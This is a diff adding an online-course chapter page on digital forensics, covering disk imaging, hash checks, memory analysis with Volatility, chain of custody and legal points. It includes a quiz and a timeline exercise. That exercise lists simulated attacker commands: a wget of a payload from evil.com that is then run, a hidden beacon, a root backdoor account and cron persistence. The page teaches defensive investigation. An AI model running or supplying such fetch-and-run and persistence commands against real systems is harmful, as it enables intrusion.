@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Digital Forensics — Academia</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css">
+  <link rel="stylesheet" href="/css/styles.css">
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'system-ui', 'sans-serif'],
+            mono: ['JetBrains Mono', 'ui-monospace', 'monospace'],
+          },
+        }
+      }
+    }
+  </script>
+</head>
+<body data-slug="122-digital-forensics" class="font-sans antialiased min-h-screen flex" style="background: var(--bg-base); color: var(--text-primary);">
+
+  <!-- Mobile overlay -->
+  <div id="sidebar-overlay" class="fixed inset-0 z-30 bg-black/60 backdrop-blur-sm lg:hidden hidden" aria-hidden="true"></div>
+
+  <!-- Sidebar -->
+  <aside id="sidebar" class="fixed left-0 top-0 z-40 h-screen w-72 max-w-[85vw] overflow-y-auto hidden lg:block" style="background: var(--bg-base); border-right: 1px solid var(--border-subtle);" aria-label="Chapter navigation">
+    <div class="sticky top-0 z-10 px-4 py-4" style="background: var(--bg-base); border-bottom: 1px solid var(--border-subtle);">
+      <div class="flex items-center justify-between">
+        <a href="/" class="flex items-center gap-2 text-sm font-semibold" style="color: var(--text-primary); text-decoration: none;">
+          <i data-lucide="book-open" style="width:16px;height:16px;color:var(--accent);"></i>
+          <span>Academia</span>
+        </a>
+        <button id="sidebar-close" class="rounded p-1 lg:hidden" style="color: var(--text-muted);" aria-label="Close sidebar">✕</button>
+      </div>
+      <div class="mt-3">
+        <div class="flex justify-between text-xs mb-1.5" style="color: var(--text-muted);">
+          <span>Progress</span>
+          <span id="progress-text">0/88</span>
+        </div>
+        <div class="h-1 rounded-full" style="background: rgba(255,255,255,0.06);">
+          <div id="progress-bar" class="h-1 rounded-full transition-all duration-500" style="width:0%; background: linear-gradient(90deg, #10b981, #34d399);"></div>
+        </div>
+      </div>
+    </div>
+    <nav id="sidebar-nav" class="px-3 py-4 space-y-1"></nav>
+  </aside>
+
+  <!-- Main content -->
+  <main class="flex-1 lg:ml-72">
+    <!-- Chapter header -->
+    <header class="sticky top-0 z-30 px-6 py-3" style="background: rgba(10,10,15,0.85); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border-subtle);">
+      <div class="flex items-center justify-between">
+        <div class="flex items-center gap-3">
+          <button id="mobile-menu-btn" class="rounded p-2 lg:hidden transition" style="color: var(--text-muted);" aria-label="Open sidebar"><i data-lucide="menu" style="width:20px;height:20px;"></i></button>
+          <nav class="flex items-center gap-2 text-sm" style="color: var(--text-muted);" aria-label="Breadcrumb">
+            <a href="/" class="transition hover:opacity-80" style="text-decoration: none; color: inherit;">Academy</a>
+            <span style="color: var(--text-muted);">/</span>
+            <span style="color: var(--text-secondary);">Digital Forensics</span>
+          </nav>
+        </div>
+        <div class="flex items-center gap-4 text-xs" style="color: var(--text-muted);">
+          <span class="flex items-center gap-1"><i data-lucide="clock" style="width:12px;height:12px;"></i> 13 min</span>
+          <span class="hidden sm:flex items-center gap-1"><i data-lucide="code" style="width:12px;height:12px;"></i> 7 min</span>
+        </div>
+      </div>
+    </header>
+
+    <!-- Chapter content -->
+    <article class="mx-auto max-w-3xl px-6 py-12">
+      <h1 class="text-2xl sm:text-3xl font-bold tracking-tight mb-3" style="color: var(--text-primary);">Digital Forensics</h1>
+      <p class="text-sm mb-10 leading-relaxed" style="color: var(--text-muted);">The science of preserving, analyzing, and presenting digital evidence after a security incident.</p>
+
+      <div class="prose prose-invert prose-zinc max-w-none prose-headings:text-zinc-100 prose-a:text-emerald-400 prose-strong:text-zinc-200 chapter-content" id="chapter-content">
+        
+<h2>The Forensic Mindset</h2>
+
+<p>Forensics answers three questions after an incident: <strong>What happened? When? Who did it?</strong> But unlike incident response (which focuses on stopping the bleeding), forensics must preserve evidence integrity — because findings may end up in court.</p>
+
+<h2>The Golden Rules</h2>
+
+<li><strong>Never work on the original evidence.</strong> Always create a forensic image and analyze the copy.</li>
+<li><strong>Document everything.</strong> Every action, tool, and timestamp must be recorded.</li>
+<li><strong>Preserve the chain of custody.</strong> Every person who handles the evidence must be logged.</li>
+<li><strong>Use validated tools.</strong> Courts require that tools produce reproducible results.</li>
+
+<div data-widget="callout" data-type="danger" data-callouttitle="One mistake can destroy a case" data-content="If you modify the original disk, even accidentally, the evidence may be inadmissible. Always image first, verify hashes, then work on the copy."></div>
+
+<h2>Chain of Custody</h2>
+
+<p>The chain of custody is a document that tracks:</p>
+
+<ul><li>Who collected the evidence, when, and where.</li>
+<li>Every transfer of custody (person, date, time, reason).</li>
+<li>Storage conditions and access logs.</li>
+</ul>
+<p>If there is a gap in the chain, a defense attorney can argue the evidence was tampered with.</p>
+
+<h2>Disk Forensics</h2>
+
+<h3>Imaging</h3>
+
+<p>A forensic image is a bit-for-bit copy of the storage device, including deleted files and unallocated space. Common formats: <strong>E01</strong> (EnCase), <strong>AFF4</strong>, <strong>dd</strong> (raw).</p>
+
+<pre><code class="language-bash"># Create a raw image with dd (Linux)&#10;dd if=/dev/sda of=/evidence/disk.img bs=4M conv=noerror,sync&#10;&#10;# Verify integrity&#10;sha256sum /dev/sda /evidence/disk.img</code></pre>
+
+<h3>What You Can Find</h3>
+
+<table><tr><td>Artifact</td><td>Location</td><td>What It Reveals</td></tr>
+</table>
+<table><tr><td>Filesystem metadata</td><td>MFT / inode</td><td>File creation, modification, access times</td></tr>
+<tr><td>Deleted files</td><td>Unallocated space</td><td>Files the attacker tried to remove</td></tr>
+<tr><td>Browser history</td><td>Chrome/Firefox profiles</td><td>Research, C2 communication via web</td></tr>
+<tr><td>Prefetch / ShimCache</td><td>Windows registry</td><td>Programs that were executed</td></tr>
+<tr><td>Event logs</td><td>/var/log, Windows Event Log</td><td>Logins, service starts, errors</td></tr>
+</table>
+<h2>Memory Forensics</h2>
+
+<p>RAM contains data that never touches disk:</p>
+
+<ul><li>Running processes and their command lines</li>
+<li>Network connections and open sockets</li>
+<li>Injected code and unpacked malware</li>
+<li>Encryption keys (briefly, while in use)</li>
+</ul>
+<p>Tools like <strong>Volatility</strong> parse a memory dump:</p>
+
+<pre><code class="language-bash"># List processes from a memory image&#10;volatility -f memdump.raw --profile=Win10x64 pslist&#10;&#10;# Show network connections&#10;volatility -f memdump.raw --profile=Win10x64 netscan</code></pre>
+
+<div data-widget="callout" data-type="tip" data-callouttitle="Capture RAM before pulling the plug" data-content="If the machine is on, capture memory first. Shutting down destroys volatile evidence. Only pull the plug if the system is actively destroying data."></div>
+
+<h2>The Investigation Workflow</h2>
+
+<li><strong>Secure the scene</strong> — isolate the machine from the network (do not shut down yet).</li>
+<li><strong>Capture volatile data</strong> — RAM, network connections, running processes.</li>
+<li><strong>Image the disk</strong> — bit-for-bit copy with hash verification.</li>
+<li><strong>Analyze the image</strong> — timeline reconstruction, artifact examination.</li>
+<li><strong>Correlate with logs</strong> — match disk findings to SIEM/network logs.</li>
+<li><strong>Report</strong> — findings with evidence references, reproducible methodology.</li>
+
+<h2>Interactive: Timeline Reconstruction</h2>
+
+<div data-widget="pyrunner" data-cellid="122-digital-forensics-cell-1" data-defaultcode="from datetime import datetime&#10;&#10;# Simulated forensic timeline events&#10;events = [&#10;  {&quot;time&quot;: &quot;2024-03-15 02:14:00&quot;, &quot;source&quot;: &quot;auth.log&quot;, &quot;event&quot;: &quot;SSH login from 185.220.101.45 as root&quot;},&#10;  {&quot;time&quot;: &quot;2024-03-15 02:14:30&quot;, &quot;source&quot;: &quot;bash_history&quot;, &quot;event&quot;: &quot;wget http://evil.com/payload.sh&quot;},&#10;  {&quot;time&quot;: &quot;2024-03-15 02:15:00&quot;, &quot;source&quot;: &quot;bash_history&quot;, &quot;event&quot;: &quot;chmod +x payload.sh &amp;&amp; ./payload.sh&quot;},&#10;  {&quot;time&quot;: &quot;2024-03-15 02:16:00&quot;, &quot;source&quot;: &quot;process list&quot;, &quot;event&quot;: &quot;New process: /tmp/.hidden/beacon (PID 4821)&quot;},&#10;  {&quot;time&quot;: &quot;2024-03-15 02:17:00&quot;, &quot;source&quot;: &quot;netstat&quot;, &quot;event&quot;: &quot;Outbound connection 10.0.0.5:443 -&gt; 185.220.101.45:8443&quot;},&#10;  {&quot;time&quot;: &quot;2024-03-15 02:20:00&quot;, &quot;source&quot;: &quot;auth.log&quot;, &quot;event&quot;: &quot;New user created: svc_update (UID 0)&quot;},&#10;  {&quot;time&quot;: &quot;2024-03-15 03:00:00&quot;, &quot;source&quot;: &quot;cron&quot;, &quot;event&quot;: &quot;Cron job added: */5 * * * * /tmp/.hidden/beacon&quot;},&#10;]&#10;&#10;# Sort and display&#10;sorted_events = sorted(events, key=lambda e: e[&quot;time&quot;])&#10;&#10;print(&quot;Forensic Timeline Reconstruction&quot;)&#10;print(&quot;=&quot; * 60)&#10;for e in sorted_events:&#10;    print(f&quot;  [{e[&#39;time&#39;]}] ({e[&#39;source&#39;]:14s}) {e[&#39;event&#39;]}&quot;)&#10;&#10;# Compute key metrics&#10;first = datetime.strptime(sorted_events[0][&quot;time&quot;], &quot;%Y-%m-%d %H:%M:%S&quot;)&#10;last = datetime.strptime(sorted_events[-1][&quot;time&quot;], &quot;%Y-%m-%d %H:%M:%S&quot;)&#10;duration = (last - first).total_seconds() / 60&#10;&#10;print(f&quot;\nAttack duration: {duration:.0f} minutes&quot;)&#10;print(f&quot;First indicator: {sorted_events[0][&#39;event&#39;]}&quot;)&#10;print(f&quot;Persistence established: cron job at 03:00&quot;)&#10;print(f&quot;Backdoor account: svc_update (UID 0)&quot;)&#10;print(f&quot;\nIOCs extracted:&quot;)&#10;print(f&quot;  IP: 185.220.101.45&quot;)&#10;print(f&quot;  Domain: evil.com&quot;)&#10;print(f&quot;  File: /tmp/.hidden/beacon&quot;)&#10;print(f&quot;  User: svc_update&quot;)" data-timeout="8" data-title="Forensic Timeline Builder"></div>
+
+<h2>Interactive: Hash Verification</h2>
+
+<div data-widget="pyrunner" data-cellid="122-digital-forensics-cell-2" data-defaultcode="import hashlib&#10;&#10;# Simulate verifying forensic image integrity&#10;original_data = b&quot;This simulates the original disk content for forensic verification.&quot;&#10;image_data = b&quot;This simulates the original disk content for forensic verification.&quot;  # identical copy&#10;tampered_data = b&quot;This simulates the original disk content for forensic verificatio.&quot;  # 1 byte changed&#10;&#10;def verify_integrity(original, copy, label):&#10;    h1 = hashlib.sha256(original).hexdigest()&#10;    h2 = hashlib.sha256(copy).hexdigest()&#10;    match = h1 == h2&#10;    print(f&quot;  {label}:&quot;)&#10;    print(f&quot;    Original SHA256: {h1[:32]}...&quot;)&#10;    print(f&quot;    Copy SHA256:     {h2[:32]}...&quot;)&#10;    print(f&quot;    Integrity: {&#39;VERIFIED&#39; if match else &#39;MISMATCH - evidence compromised!&#39;}&quot;)&#10;    print()&#10;&#10;print(&quot;Forensic Image Hash Verification&quot;)&#10;print(&quot;=&quot; * 55)&#10;verify_integrity(original_data, image_data, &quot;Forensic image (clean copy)&quot;)&#10;verify_integrity(original_data, tampered_data, &quot;Tampered image (1 byte changed)&quot;)" data-timeout="8" data-title="Evidence Integrity Check"></div>
+
+<h2>Legal Considerations</h2>
+
+<ul><li><strong>Authorization</strong> — you need legal authority to examine the device.</li>
+<li><strong>Privacy</strong> — employee data, personal files, and privileged communications may be present.</li>
+<li><strong>Jurisdiction</strong> — cross-border data has different rules (GDPR, CLOUD Act).</li>
+<li><strong>Expert testimony</strong> — the analyst may need to explain methods to a jury.</li>
+</ul>
+<h2>Summary</h2>
+
+<p>Digital forensics is disciplined evidence handling: image first, verify hashes, reconstruct timelines, and document everything. The goal is not just to understand the attack, but to produce findings that survive legal scrutiny.</p>
+
+<div data-widget="quiz" data-chapterslug="122-digital-forensics" data-quizid="quiz-122-digital-forensics"></div>
+
+<script type="application/json" id="quiz-122-digital-forensics">[{"id":"q1","type":"multiple-choice","prompt":"Why must you never analyze the original evidence directly?","options":["Original evidence is too large","Any modification could make the evidence inadmissible in court","Forensic tools only work on copies","The original is encrypted"],"correctIndex":1,"explanation":"Working on the original risks modifying timestamps, files, or metadata. Courts require evidence integrity, so all analysis must happen on a verified forensic image.","randomize":true},{"id":"q2","type":"multiple-choice","prompt":"What should you do FIRST when arriving at a live compromised machine?","options":["Shut it down immediately","Capture volatile data (RAM, network connections) before anything else","Reinstall the operating system","Disconnect the power cable"],"correctIndex":1,"explanation":"RAM contains running processes, network connections, and possibly encryption keys that vanish on shutdown. Capture volatile data first, then image the disk.","randomize":true},{"id":"q3","type":"multiple-choice","prompt":"What is the purpose of the chain of custody document?","options":["To list all IOCs found","To track every person who handled the evidence and when","To store the forensic image","To record the SIEM alert rules"],"correctIndex":1,"explanation":"The chain of custody logs every transfer of evidence. A gap allows a defense attorney to argue the evidence was tampered with, potentially making it inadmissible.","randomize":true},{"id":"q4","type":"multiple-choice","prompt":"Why is SHA-256 used to verify forensic images?","options":["It compresses the image","It encrypts the evidence","It proves the copy is bit-for-bit identical to the original","It scans for malware"],"correctIndex":2,"explanation":"SHA-256 produces a unique digest of the data. If the hash of the image matches the hash of the original, the copy is verified as identical. Even one changed byte produces a completely different hash.","randomize":true}]</script>
+
+      </div>
+
+      <!-- Prev / Next -->
+      <nav class="mt-16 flex items-center justify-between pt-8" style="border-top: 1px solid var(--border-subtle);" aria-label="Chapter navigation">
+        <a href="/chapters/121-threat-intelligence.html" class="btn-ghost" style="font-size: 0.8125rem; padding: 0.5rem 1rem;">← Previous</a>
+        <a href="/chapters/123-zero-trust-architecture.html" class="btn-primary" style="font-size: 0.8125rem; padding: 0.5rem 1rem;">Next →</a>
+      </nav>
+    </article>
+  </main>
+
+  <script type="module" src="/js/chapter.js"></script>
+  <script>lucide.createIcons()</script>
+</body>
+</html>
